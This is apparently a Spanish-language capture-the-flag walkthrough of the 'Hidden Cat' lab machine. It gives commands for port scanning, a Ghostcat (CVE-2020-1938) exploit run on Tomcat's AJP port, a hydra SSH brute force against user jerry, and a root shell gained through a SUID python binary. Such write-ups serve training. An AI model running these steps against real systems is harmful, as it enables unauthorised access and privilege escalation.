# MÁQUINA HIDDEN CAT

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Hidden%20Cat/foto.jpg)

Tenemos 3 puertos abiertos, el 22, el 8080 y el 8009. Vamos a revisar el contenido del puerto 8080 ya que al 8009 ni nos deja acceder:

![WEB](https://github.com/Isma-yo/photos/blob/main/Hidden%20Cat/foto2.jpg)

Es una página de tomcat normal y corriente. Tenemos la versión de tomcat asi que vamos a ver si existe alguna vulnerabilidad que si la hay y es donde entra l puerto 8009:

https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md

```shell
python2.7 CVE-2020-1938.py 172.17.0.2 -p 8009 -f WEB-INF/web.xml
```

![jerr](https://github.com/Isma-yo/photos/blob/main/Hidden%20Cat/foto3.jpg)

Hemos encontrado el nombre de un posible usuario jerry, por lo que vamos a intentar obtener su contraseña utilizando un ataque de fuerza bruta:

```shell
hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![HYD](https://github.com/Isma-yo/photos/blob/main/Hidden%20Cat/foto4.jpg)

Tenemos su contraseña, vamos a acceder a la máquina a través de SSH:

![SSH](https://github.com/Isma-yo/photos/blob/main/Hidden%20Cat/foto5.jpg)

Si ejecutamos el comando find / -perm -4000 2>/dev/null vemos que python tiene permisos especiales, por lo que miraremos en GTFOBins como poder escalar privilegios:

https://gtfobins.github.io/gtfobins/python/#suid

```shell
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Hidden%20Cat/foto6.jpg)

Y ya somos root!

